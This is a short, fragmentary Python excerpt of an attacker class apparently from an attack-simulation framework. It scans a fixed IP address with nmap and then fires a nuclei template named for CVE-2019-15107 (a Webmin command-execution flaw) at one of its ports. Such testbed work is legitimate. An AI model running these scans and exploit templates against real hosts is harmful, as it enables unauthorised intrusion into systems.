...
class OSCI_CVE_2019_15107_Attacker2(AttackerBase):
    ...
    def discovery(self) -> None:     
        self.commandRunner.runCommand("nmap -n -Pn -p 80,443,10000, 30001,30002, 30003 144.122.71.18")
                ...
                #self.commandRunner.runCommand("ping")
        #self.commandRunner.runCommand('netstat -a')

    def main(self):
        print("Main method started")
        #self.commandRunner.runCommand('echo "nuclei script started" ')     
        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30003 -t /home/vagrant/CVE-2019-15107_Payload.yaml -debug ')
